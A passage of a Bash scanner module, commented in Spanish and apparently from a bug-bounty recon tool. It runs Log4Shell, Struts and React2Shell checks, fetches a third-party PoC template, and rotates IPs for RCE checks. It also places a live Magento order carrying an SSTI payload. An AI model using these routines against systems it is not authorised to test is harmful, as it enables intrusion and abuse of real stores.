#              headers X-Powered-By: JSF, .do/.action endpoints, JSESSIONID
_scan_log4shell() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"

  # ── Detectar subdominios con tecnología Java ───────────────
  # 1. Desde la DB de tech fingerprinting (módulo 10)
  local JAVA_SUBS_DB
  JAVA_SUBS_DB=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%Java%' OR tech_name LIKE '%Tomcat%'
            OR tech_name LIKE '%Spring%' OR tech_name LIKE '%Log4j%'
            OR tech_name LIKE '%Struts%' OR tech_name LIKE '%JBoss%'
            OR tech_name LIKE '%WebLogic%' OR tech_name LIKE '%Jetty%'
            OR tech_name LIKE '%GlassFish%' OR tech_name LIKE '%WildFly%'
            OR tech_name LIKE '%Elasticsearch%' OR tech_name LIKE '%Liferay%'
            OR tech_name LIKE '%OpenCms%' OR tech_name LIKE '%Hippo%'
            OR tech_name LIKE '%Bloomreach%' OR tech_name LIKE '%Hybris%'
            OR tech_name LIKE '%Jenkins%' OR tech_name LIKE '%Confluence%'
            OR tech_name LIKE '%JIRA%' OR tech_name LIKE '%Bitbucket%');" 2>/dev/null)

  # 2. URLs con extensiones o rutas Java — trailing % para capturar query strings
  local JAVA_SUBS_URLS
  JAVA_SUBS_URLS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM subdomains s
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND EXISTS (
         SELECT 1 FROM urls u
         WHERE u.domain_id=s.domain_id
           AND (u.url LIKE '%.jsp%' OR u.url LIKE '%.do%'
                OR u.url LIKE '%.action%' OR u.url LIKE '%.jsf%'
                OR u.url LIKE '%/system/modules/%'
                OR u.url LIKE '%/opencms/%' OR u.url LIKE '%/cms/workspace%'
                OR u.url LIKE '%struts%' OR u.url LIKE '%spring%'
                OR u.url LIKE '%actuator%' OR u.url LIKE '%/jolokia/%')
       );" 2>/dev/null)

  # 3. Fallback: todos los subdominios alive si no hay tech/URL signal
  #    pero SÍ hay headers Java conocidos en HTTP responses
  local JAVA_SUBS_HEADERS
  JAVA_SUBS_HEADERS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive'
       AND (http_title LIKE '%Tomcat%' OR http_title LIKE '%GlassFish%'
            OR http_title LIKE '%JBoss%' OR http_title LIKE '%WildFly%'
            OR http_title LIKE '%Jenkins%' OR http_title LIKE '%Spring%');" 2>/dev/null)

  # Combinar y deduplicar
  local ALL_JAVA_SUBS
  ALL_JAVA_SUBS=$(printf '%s\n%s\n%s' \
    "$JAVA_SUBS_DB" "$JAVA_SUBS_URLS" "$JAVA_SUBS_HEADERS" \
    | grep -v '^$' | sort -u)

  if [[ -z "$ALL_JAVA_SUBS" ]]; then
    log_info "  Log4Shell: sin tecnología Java detectada — saltando"
    log_info "  (Para forzar: añade el subdominio manualmente con --target)"
    return
  fi

  local JAVA_COUNT
  JAVA_COUNT=$(echo "$ALL_JAVA_SUBS" | wc -l | tr -d ' ')
  log_info "  Log4Shell (CVE-2021-44228) — $JAVA_COUNT targets Java detectados"

  # ── Crear archivo de targets Java ─────────────────────────
  local JAVA_TARGETS="$OUT_DIR/.log4j_java_targets.txt"
  echo "$ALL_JAVA_SUBS" | while IFS= read -r SUB; do
    [[ -n "$SUB" ]] && echo "https://${SUB}"
  done > "$JAVA_TARGETS"

  # ── Nuclei con templates Log4Shell ────────────────────────
  if command -v nuclei &>/dev/null && [[ -s "$JAVA_TARGETS" ]]; then
    nuclei       -l "$JAVA_TARGETS"       -tags "log4j,cve-2021-44228,cve-2021-45046,cve-2021-45105"       -silent -jsonl 2>/dev/null |       while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TEMPLATE SEV HOST
        TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','critical'))" 2>/dev/null)
        HOST=$(echo "$LINE"     | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        log_warn "  ⚡⚡ LOG4SHELL detectado: $HOST"
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$HOST"           "Log4Shell CVE-2021-44228" "critical"           "CRÍTICO: Log4j vulnerable — $TEMPLATE" "nuclei:$TEMPLATE"
        notify_nuclei_finding "$DOMAIN" "$TEMPLATE" "critical" "$HOST"           "Log4Shell CVE-2021-44228"
      done
  fi

  # ── log4j-scan herramienta dedicada ───────────────────────
  if _ensure_log4j_scan 2>/dev/null &&      [[ -f "$HOME/tools/log4j-scan/log4j-scan.py" ]] &&      [[ -s "$JAVA_TARGETS" ]]; then
    log_info "  log4j-scan sobre $JAVA_COUNT targets Java..."
    timeout 300 python3 "$HOME/tools/log4j-scan/log4j-scan.py"       -l "$JAVA_TARGETS"       --run-all-tests       2>/dev/null | grep -i "vulnerable" |       while IFS= read -r LINE; do
        log_warn "  ⚡⚡ log4j-scan: $LINE"
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$DOMAIN"           "Log4Shell log4j-scan" "critical" "$LINE" "log4j-scan"
      done
  fi

  rm -f "$JAVA_TARGETS"
}

# ── Magento ───────────────────────────────────────────────────
_scan_magento() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(_get_subs_with_tech "$DOMAIN_ID" "%Magento%")
  [[ -z "$SUBS" ]] && return

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  Magento scan → $BASE"

    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" \
        -tags "magento,ecommerce" \
        -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "Magento" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi

    # CVE-2022-24086: SSTI via order billing address
    _test_magento_ssti "$DOMAIN_ID" "$DOMAIN" "$BASE"

    # Admin panel en path por defecto
    local ADMIN_CODE
    ADMIN_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}/admin/")
    if [[ "$ADMIN_CODE" == "200" ]]; then
      _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
        "Magento" "low" "Panel de administración accesible en /admin/ (path por defecto)" \
        "admin_default_path"
    fi

    # GraphQL introspection habilitada
    local GQL_CODE
    GQL_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
      -X POST "${BASE}/graphql" \
      -H "Content-Type: application/json" \
      -d '{"query":"{__typename}"}')
    if [[ "$GQL_CODE" == "200" ]]; then
      local INTRO
      INTRO=$(curl -sk -X POST "${BASE}/graphql" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __schema { queryType { name } } }"}' | \
        python3 -c "import sys,json; d=json.load(sys.stdin); print('ok' if d.get('data',{}).get('__schema') else 'no')" 2>/dev/null)
      if [[ "$INTRO" == "ok" ]]; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/graphql" \
          "Magento" "low" "GraphQL introspection habilitada — esquema completo accesible" \
          "graphql_introspection"
      fi
    fi

  done <<< "$SUBS"
}

# ── Magento CVE-2022-24086: SSTI via billing address ──────────
# Intenta colocar una orden con template directive en la dirección
# de facturación. Si la expresión se evalúa en el email de confirmación
# (Magento template engine), hay SSTI → posible RCE.
# Requiere credenciales de cliente en vault (tabla auth_credentials).
_test_magento_ssti() {
  local DOMAIN_ID="$1" DOMAIN="$2" BASE="$3"
  local SUB
  SUB=$(echo "$BASE" | sed 's|https\?://||;s|/.*||')

  # Buscar credenciales de cliente Magento en vault
  local CRED_ROW
  CRED_ROW=$(sqlite3 "$DB_PATH" \
    "SELECT username, password_enc FROM auth_credentials
     WHERE domain_id=${DOMAIN_ID}
       AND subdomain='${SUB//\'/\'\'}' AND valid=1
     LIMIT 1;" 2>/dev/null)
  [[ -z "$CRED_ROW" ]] && return

  local USERNAME PASSWORD_ENC
  IFS='|' read -r USERNAME PASSWORD_ENC <<< "$CRED_ROW"
  local PASSWORD
  PASSWORD=$(python3 -c "
import sys; sys.path.insert(0,'${SCRIPT_DIR}/core')
from vault import decrypt; print(decrypt('${PASSWORD_ENC//\'/\\\'}'))
" 2>/dev/null)
  [[ -z "$PASSWORD" ]] && return

  log_info "  [CVE-2022-24086] Probando SSTI en billing address con cuenta ${USERNAME}"

  # ── 1. Obtener token GraphQL ───────────────────────────────
  local TOKEN
  TOKEN=$(curl -sk -X POST "${BASE}/graphql" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { generateCustomerToken(email: \\\"${USERNAME}\\\", password: \\\"${PASSWORD}\\\") { token } }\"}" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('generateCustomerToken',{}).get('token',''))" 2>/dev/null)
  [[ -z "$TOKEN" ]] && return

  # ── 2. Crear carrito ───────────────────────────────────────
  local CART_ID
  CART_ID=$(curl -sk -X POST "${BASE}/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${TOKEN}" \
    -d '{"query":"mutation { createEmptyCart }"}' | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('createEmptyCart',''))" 2>/dev/null)
  [[ -z "$CART_ID" ]] && return

  # ── 3. Añadir primer producto disponible al carrito ────────
  local FIRST_SKU
  FIRST_SKU=$(curl -sk -X POST "${BASE}/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ products(search: \"a\", pageSize: 1) { items { sku } } }"}' | \
    python3 -c "import sys,json; d=json.load(sys.stdin); items=d.get('data',{}).get('products',{}).get('items',[]); print(items[0]['sku'] if items else '')" 2>/dev/null)
  [[ -z "$FIRST_SKU" ]] && return

  curl -sk -X POST "${BASE}/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${TOKEN}" \
    -d "{\"query\":\"mutation { addSimpleProductsToCart(input: { cart_id: \\\"${CART_ID}\\\", cart_items: [{ data: { quantity: 1, sku: \\\"${FIRST_SKU}\\\" } }] }) { cart { id } } }\"}" \
    -o /dev/null 2>/dev/null

  # ── 4. Poner dirección de facturación con payload SSTI ─────
  # Payload seguro: config path retorna email de la tienda (visible en admin)
  # No inyectar payloads destructivos
  local SSTI_MARKER="HACKEADORA_SSTI_$(date +%s)"
  local SSTI_PAYLOAD="{{config path=\"trans_email/ident_general/email\"}} ${SSTI_MARKER}"

  curl -sk -X POST "${BASE}/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${TOKEN}" \
    -d "{\"query\":\"mutation { setBillingAddressOnCart(input: { cart_id: \\\"${CART_ID}\\\", billing_address: { address: { firstname: \\\"Test\\\", lastname: \\\"User\\\", street: [\\\"${SSTI_PAYLOAD//\"/\\\"}\\\"], city: \\\"Sydney\\\", region: { region_id: 570 }, country_code: \\\"AU\\\", postcode: \\\"2000\\\", telephone: \\\"0400000000\\\" } } }) { cart { id } } }\"}" \
    -o /dev/null 2>/dev/null

  # ── 5. Establecer método de pago y colocar orden ───────────
  local PAYMENT_METHOD
  PAYMENT_METHOD=$(curl -sk -X POST "${BASE}/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${TOKEN}" \
    -d "{\"query\":\"{ cart(cart_id: \\\"${CART_ID}\\\") { available_payment_methods { code } } }\"}" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); methods=d.get('data',{}).get('cart',{}).get('available_payment_methods',[]); print(methods[0]['code'] if methods else 'free')" 2>/dev/null)
  [[ -z "$PAYMENT_METHOD" ]] && PAYMENT_METHOD="free"

  curl -sk -X POST "${BASE}/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${TOKEN}" \
    -d "{\"query\":\"mutation { setPaymentMethodOnCart(input: { cart_id: \\\"${CART_ID}\\\", payment_method: { code: \\\"${PAYMENT_METHOD}\\\" } }) { cart { id } } }\"}" \
    -o /dev/null 2>/dev/null

  local ORDER_NUM
  ORDER_NUM=$(curl -sk -X POST "${BASE}/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${TOKEN}" \
    -d "{\"query\":\"mutation { placeOrder(input: { cart_id: \\\"${CART_ID}\\\" }) { order { order_number } } }\"}" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('placeOrder',{}).get('order',{}).get('order_number',''))" 2>/dev/null)

  if [[ -n "$ORDER_NUM" ]]; then
    # ── 6. Registrar finding — la confirmación llega por email ─
    _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
      "Magento" "critical" \
      "CVE-2022-24086 — SSTI payload almacenado en order ${ORDER_NUM} billing address street. " \
      "Marker: ${SSTI_MARKER}. " \
      "Si el email de confirmación incluye el email de la tienda en lugar del texto literal '{{config...}}', el template engine está evaluando input del usuario → RCE. " \
      "Ver: https://nvd.nist.gov/vuln/detail/CVE-2022-24086" \
      "magento_ssti_cve_2022_24086"

    log_warn "  🚨 [CRITICAL] CVE-2022-24086 payload almacenado en orden ${ORDER_NUM}"
    log_info "  Marker: ${SSTI_MARKER} — comprueba si el email de confirmación evalúa {{config...}}"

    _telegram_send "🚨 *CVE-2022-24086 SSTI — Magento*
🌐 \`${BASE}\`
📦 Orden: \`${ORDER_NUM}\`
🔍 Marker: \`${SSTI_MARKER}\`
⚠️ Si el email de confirmación muestra el email de la tienda en vez del texto literal, hay SSTI → RCE
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  else
    log_info "  [CVE-2022-24086] Orden no colocada (checkout deshabilitado o error) — probando contact form"
    _test_magento_ssti_contact "$DOMAIN_ID" "$DOMAIN" "$BASE"
  fi

  # También probar el contact form como vector SSTI sincrónico
  _test_magento_ssti_contact "$DOMAIN_ID" "$DOMAIN" "$BASE"
}

# ── SSTI via contact form (envío síncrono — respuesta inmediata) ─
_test_magento_ssti_contact() {
  local DOMAIN_ID="$1" DOMAIN="$2" BASE="$3"

  local CONTACT_URL="${BASE}/contact/index/post/"
  local FORM_PAGE
  FORM_PAGE=$(curl -skL --max-time 10 "${BASE}/contact/" 2>/dev/null)
  [[ -z "$FORM_PAGE" ]] && return

  local FORM_KEY
  FORM_KEY=$(echo "$FORM_PAGE" | grep -oP 'form_key.*?value="\K[^"]+' | head -1)
  [[ -z "$FORM_KEY" ]] && return

  local MARKER="HACKEADORA_CONTACT_$(date +%s)"

  local STATUS
  STATUS=$(curl -sk -X POST "$CONTACT_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer: ${BASE}/contact/" \
    --data-urlencode "form_key=${FORM_KEY}" \
    --data-urlencode "name=Security Test" \
    --data-urlencode "email=security@hackeadora.local" \
    --data-urlencode "telephone=0000000000" \
    --data-urlencode "comment={{config path=\"trans_email/ident_general/email\"}} ${MARKER}" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)

  if [[ "$STATUS" == "302" || "$STATUS" == "200" ]]; then
    _cms_finding "$DOMAIN_ID" "$DOMAIN" "$CONTACT_URL" \
      "Magento" "high" \
      "SSTI via contact form — payload '{{config path=...}}' enviado (marker: ${MARKER}). " \
      "Si el email recibido por el admin contiene el email de la tienda en vez del texto literal, el template engine evalúa input del usuario." \
      "magento_ssti_contact_form"
    log_warn "  🔴 [HIGH] SSTI payload enviado por contact form — marker: ${MARKER}"
  fi
}

# ── Apache Struts ─────────────────────────────────────────────
_scan_apache_struts() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%Struts%' OR tech_name LIKE '%Apache%');" 2>/dev/null)
  [[ -z "$SUBS" ]] && return

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"

    # CVE-2017-5638 (Struts RCE), CVE-2023-50164
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" \
        -tags "struts,cve-2017-5638,cve-2023-50164" \
        -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "Apache Struts" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── React2Shell (CVE-2025-55182 / CVE-2025-66478) ────────────
# RCE en Next.js / React Server Components (RSC)
# Solo se lanza contra subdominios donde se detecta Next.js/React.
# Indicadores: header x-powered-by: Next.js, __NEXT_DATA__ en HTML,
#              /_next/ en URLs, x-nextjs-* headers, Vercel headers
_scan_react2shell() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"

  # ── 1. Desde DB de tech fingerprinting (módulo 10) ─────────
  local REACT_SUBS_DB
  REACT_SUBS_DB=$(sqlite3 "$DB_PATH"     "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%Next.js%' OR tech_name LIKE '%Next%'
            OR tech_name LIKE '%React%' OR tech_name LIKE '%Vercel%');"     2>/dev/null)

  # ── 2. URLs con paths /_next/ → seguro que es Next.js ──────
  local REACT_SUBS_URLS
  REACT_SUBS_URLS=$(sqlite3 "$DB_PATH"     "SELECT DISTINCT subdomain FROM subdomains s
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND EXISTS (
         SELECT 1 FROM urls u
         WHERE u.domain_id=s.domain_id
           AND u.url LIKE '%/_next/%'
       );" 2>/dev/null)

  # ── Combinar y deduplicar — solo evidencia de DB y URLs ────
  # No hacemos live detection: si el módulo 10 no lo detectó
  # y no hay URLs /_next/ en la DB, no lanzamos React2Shell
  local ALL_REACT_SUBS
  ALL_REACT_SUBS=$(printf '%s\n%s' \
    "$REACT_SUBS_DB" "$REACT_SUBS_URLS" | \
    grep -v '^$' | sort -u)

  if [[ -z "$ALL_REACT_SUBS" ]]; then
    log_info "  React2Shell: sin Next.js/React detectado — saltando"
    return
  fi

  local REACT_COUNT
  REACT_COUNT=$(echo "$ALL_REACT_SUBS" | wc -l | tr -d ' ')
  log_info "  React2Shell (CVE-2025-55182/66478) — $REACT_COUNT targets Next.js/React"

  local SUBS="$ALL_REACT_SUBS"

  log_info "  React2Shell (CVE-2025-55182/66478) check..."

  # ── Descargar template nuclei si no está ─────────────────
  local TEMPLATE_DIR="$HOME/.config/nuclei/react2shell"
  local TEMPLATE_FILE="$TEMPLATE_DIR/react2shell.yaml"

  if [[ ! -f "$TEMPLATE_FILE" ]]; then
    log_info "  Descargando template react2shell..."
    mkdir -p "$TEMPLATE_DIR"
    curl -sL       "https://raw.githubusercontent.com/shamo0/react2shell-PoC/main/react2shell.yaml"       -o "$TEMPLATE_FILE" 2>/dev/null || {
      log_warn "  No se pudo descargar react2shell.yaml — saltando"
      return
    }
    log_ok "  Template react2shell descargado"
  fi

  if ! command -v nuclei &>/dev/null; then
    log_warn "  nuclei no disponible para react2shell check"
    return
  fi

  source "${SCRIPT_DIR}/core/rotator.sh" 2>/dev/null || true

  # Crear archivo de targets
  local TARGETS="$OUT_DIR/.react2shell_targets.txt"
  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    echo "https://${SUB}"
    echo "http://${SUB}"
  done <<< "$SUBS" | sort -u > "$TARGETS"

  local R2S_OUT="$OUT_DIR/.react2shell_results.json"

  local R2S_CMD="nuclei -l ${TARGETS} -t ${TEMPLATE_FILE} -silent -jsonl 2>/dev/null > ${R2S_OUT}"

  # IP rotada — es un check de RCE, mejor desde IP limpia
  if rotator_enabled; then
    rotator_exec "$R2S_CMD" "$R2S_OUT" || eval "$R2S_CMD"
  else
    eval "$R2S_CMD"
  fi

  if [[ -s "$R2S_OUT" ]]; then
    while IFS= read -r LINE; do
      [[ -z "$LINE" ]] && continue
      local TEMPLATE SEV HOST MATCHED
      TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','react2shell'))" 2>/dev/null)
      SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','critical'))" 2>/dev/null)
      HOST=$(echo "$LINE"     | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
      MATCHED=$(echo "$LINE"  | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('extracted-results',[''])[0] if d.get('extracted-results') else '')" 2>/dev/null)

      log_warn "  ⚡⚡ REACT2SHELL RCE: $HOST"

      _cms_finding "$DOMAIN_ID" "$DOMAIN" "$HOST"         "React2Shell RCE" "critical"         "CVE-2025-55182/66478: RCE en Next.js RSC — $HOST ${MATCHED:+→ $MATCHED}"         "react2shell"

      # Notificación urgente
      _telegram_send "🚨🚨 *React2Shell RCE CRÍTICO*
🌐 \`${DOMAIN}\`
🎯 \`${HOST}\`
💀 CVE-2025-55182 / CVE-2025-66478
⚠️ Remote Code Execution en Next.js RSC
📋 Template: \`${TEMPLATE}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

      notify_nuclei_finding "$DOMAIN" "react2shell" "critical" "$HOST"         "React2Shell RCE CVE-2025-55182/66478"

    done < "$R2S_OUT"
  fi

  rm -f "$TARGETS" "$R2S_OUT"
}

# ── SAP Hybris Commerce Cloud ─────────────────────────────────
_scan_hybris() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"

  # Detección: tech DB + URLs con paths característicos de Hybris
  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%Hybris%' OR tech_name LIKE '%SAP Commerce%'
            OR tech_name LIKE '%storefront%')
     UNION
     SELECT DISTINCT s.subdomain FROM subdomains s
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND EXISTS (
         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
           AND (u.url LIKE '%storefront%' OR u.url LIKE '%/hac/%'
                OR u.url LIKE '%/backoffice/%' OR u.url LIKE '%srcatc%'
                OR u.url LIKE '%samlsso%')
       );" 2>/dev/null)

  # Detección adicional: probar /hac/ en todos los subdominios alive si no hay hits en DB
  if [[ -z "$SUBS" ]]; then
    local ALIVE_SUBS
    ALIVE_SUBS=$(sqlite3 "$DB_PATH" \
      "SELECT subdomain FROM subdomains WHERE domain_id=${DOMAIN_ID} AND status='alive';" \
      2>/dev/null)
    while IFS= read -r SUB; do
      [[ -z "$SUB" ]] && continue
      local HAC_STATUS
      HAC_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 6 \
        -o /dev/null -w "%{http_code}" "https://${SUB}/hac/" 2>/dev/null)
      # 403 o 302 en /hac/ ya indica que Hybris está detrás
      if [[ "$HAC_STATUS" == "200" || "$HAC_STATUS" == "302" || "$HAC_STATUS" == "401" ]]; then
        SUBS="${SUBS}${SUB}"$'\n'
        log_info "  Hybris detectado por /hac/ en $SUB (HTTP $HAC_STATUS)"
      fi
    done <<< "$ALIVE_SUBS"
  fi

  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  SAP Hybris scan → $BASE"

    # HAC (Hybris Admin Console) — si está abierto es critical
    for HAC_PATH in "/hac/" "/hac/console" "/hac/monitoring/cache" "/hac/platform"; do
      local STATUS BODY
      STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
        -o /tmp/.hybris_$$ -w "%{http_code}" -L "${BASE}${HAC_PATH}" 2>/dev/null)
      if [[ "$STATUS" == "200" ]]; then
        BODY=$(head -c 200 /tmp/.hybris_$$ 2>/dev/null)
        if echo "$BODY" | grep -qi "hac\|hybris\|SAP\|Platform\|console"; then
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${HAC_PATH}" \
            "SAP Hybris HAC Exposed" "critical" \
            "Hybris Admin Console accesible sin autenticación: ${HAC_PATH}" "hybris_hac"
        fi
      fi
    done

    # Backoffice (gestión de catálogo/pedidos)
    local BO_STATUS BO_BODY BO_HEADERS
    BO_HEADERS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -D - -o /tmp/.bo_body_$$ -w "" -L "${BASE}/backoffice/" 2>/dev/null)
    BO_STATUS=$(echo "$BO_HEADERS" | grep -oP '(?<=HTTP/\S\s)\d+' | tail -1)
    BO_BODY=$(cat /tmp/.bo_body_$$ 2>/dev/null | head -c 3000)
    rm -f /tmp/.bo_body_$$
    if [[ "$BO_STATUS" == "200" ]]; then
      # Descartar SPAs CSR y CF Access — devuelven 200 para todas las rutas
      if ! is_cf_access_response "$BO_HEADERS" && \
         ! is_spa_csr_body "$BO_BODY" && \
         ! is_same_as_root "$BASE" "$BO_BODY" "$CURL_PROXY"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/backoffice/" \
          "SAP Hybris Backoffice Exposed" "critical" \
          "Backoffice de administración accesible" "hybris_backoffice"
      fi
    fi

    # SAML metadata — puede revelar entityID, certificados y URLs internas
    for SAML_PATH in "/saml/metadata" "/samlsso/metadata" "/srcatcsamlsso/saml/metadata" \
                     "/${SUB%%.*}samlsso/saml/metadata"; do
      local SAML_STATUS SAML_BODY
      SAML_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
        -o /tmp/.saml_$$ -w "%{http_code}" "${BASE}${SAML_PATH}" 2>/dev/null)
      if [[ "$SAML_STATUS" == "200" ]]; then
        SAML_BODY=$(head -c 300 /tmp/.saml_$$ 2>/dev/null)
        if echo "$SAML_BODY" | grep -qi "EntityDescriptor\|md:EntityID\|saml"; then
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${SAML_PATH}" \
            "SAML Metadata Exposed" "medium" \
            "Metadata SAML accesible — expone entityID, URLs internas y certificados: ${SAML_PATH}" "hybris_saml"
        fi
      fi
    done

    rm -f /tmp/.hybris_$$ /tmp/.saml_$$

    # Nuclei templates SAP Commerce
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" -tags "sap,hybris,commerce" -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "SAP Hybris Nuclei" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── SharePoint ────────────────────────────────────────────────
_scan_sharepoint() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"

  # Detección: tech DB + URLs con paths característicos de SharePoint
  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%SharePoint%' OR tech_name LIKE '%Microsoft%')
     UNION
     SELECT DISTINCT s.subdomain FROM subdomains s
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND EXISTS (
         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
           AND (u.url LIKE '%/_layouts/15/%' OR u.url LIKE '%/Style Library/%'
                OR u.url LIKE '%/_vti_bin/%' OR u.url LIKE '%/_api/%'
                OR u.url LIKE '%/sites/%' OR u.url LIKE '%.aspx%')
       );" 2>/dev/null)

  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  SharePoint scan → $BASE"

    # Necesitamos determinar el site path base (puede ser /ca/, /es/, /sites/X/, etc.)
    local SITE_BASES=("" "/ca" "/es" "/en" "/sites/default")
    # Intentar descubrir base desde URLs en DB
    local DB_BASE
    DB_BASE=$(sqlite3 "$DB_PATH" \
